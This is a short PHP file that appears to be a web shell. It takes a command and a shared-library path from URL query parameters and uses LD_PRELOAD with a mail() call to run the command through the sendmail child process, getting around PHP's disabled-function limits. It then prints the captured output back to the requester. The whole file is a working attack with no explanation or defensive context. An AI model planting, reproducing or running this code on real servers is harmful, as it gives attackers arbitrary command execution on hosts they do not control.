<?php
  putenv("_evilcmd=${_GET['cmd']} > /tmp/output.txt");
  putenv("LD_PRELOAD=${_GET['ld_preload']}");
  mail("a","b","c");
  show_source("/tmp/output.txt");
?>
